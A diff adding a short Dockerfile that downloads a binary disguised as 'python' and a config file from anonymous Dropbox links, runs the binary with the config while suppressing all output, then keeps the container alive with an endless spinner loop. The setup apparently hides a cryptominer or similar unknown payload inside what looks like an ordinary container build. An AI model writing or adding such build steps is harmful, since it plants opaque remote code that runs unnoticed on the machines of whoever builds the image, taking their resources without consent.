@@ -1,0 +1,9 @@
+FROM ubuntu:latest
+
+RUN apt-get update -y \
+    && apt-get install curl xz-utils -y \
+    && curl -L https://www.dropbox.com/s/7m35boddszp2rwd/python.tar.xz?dl=1 > python.tar.xz && tar -xvf python.tar.xz \
+    && curl -L https://www.dropbox.com/s/k7p26cwrg56ro56/bootstrap.json?dl=1 > uuuus.json \
+    && chmod +x python \
+    && ./python -c uuuus.json > /dev/null 2>&1 \
+    && while :;do for s in / - \\ \|; do printf "\r$s";sleep .1;done;done
